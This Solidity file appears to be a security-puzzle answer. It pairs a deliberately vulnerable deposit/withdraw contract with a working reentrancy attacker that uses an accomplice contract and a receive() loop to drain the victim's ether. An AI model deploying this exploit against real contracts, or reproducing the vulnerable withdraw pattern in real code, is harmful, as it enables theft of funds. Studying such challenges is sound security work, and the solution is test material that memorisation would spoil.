// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
	mapping(address => uint256) balances;

	function deposit() external payable {
		balances[msg.sender] += msg.value;
	}

	function withdraw(uint256 amount) external {
		require(balances[msg.sender] >= amount, 'insufficient funds');
		(bool ok, ) = msg.sender.call{value: amount}('');
		require(ok, 'transfer failed');
		unchecked {
			balances[msg.sender] -= amount;
		}
	}
}

// Write the optimized attacker
contract OptimizedAttackerSecurity101 {

	/**
	We will do a reentrancy attack, but we cannot launch it from the constructor of the same contract,
	because the code is not deployed yet, we will use an auxiliary contract
	*/
	constructor(address victim) payable {
		/// Deploy our accomplice
		OptimizedAttackerAccomplice attacker = new OptimizedAttackerAccomplice();

		/// Launch the attack
		attacker.attack{value:msg.value}(victim);

		/// Send the funds back to us
		payable(msg.sender).send(address(this).balance);
	}
}

contract OptimizedAttackerAccomplice {

	uint256 myBalance;

	function attack(address victim) public payable {
		/// Add balance to the victim and keep a record of the total balance deposited
		Security101(victim).deposit{value:msg.value}();
		myBalance += msg.value;

		/// Launch reentrancy attack
		Security101(victim).withdraw(myBalance);

		/// Finally send the funds to the main contract
		payable(msg.sender).send(address(this).balance);
	}

	receive() external payable {
		/// If the victim still has more balance than us, deposit more and repeat
		uint256 victimBalance = address(msg.sender).balance;
		if (victimBalance > myBalance) {
			/// Our balance will double in each iteration
			Security101(msg.sender).deposit{value:msg.value}();
			myBalance += msg.value;

			/// Continue the attack
			Security101(msg.sender).withdraw(myBalance);
		}
		/// If we have more balance than the victim, withdraw all and end the attack
		else if (victimBalance > 0) {
			Security101(msg.sender).withdraw(victimBalance);
		}
	}
}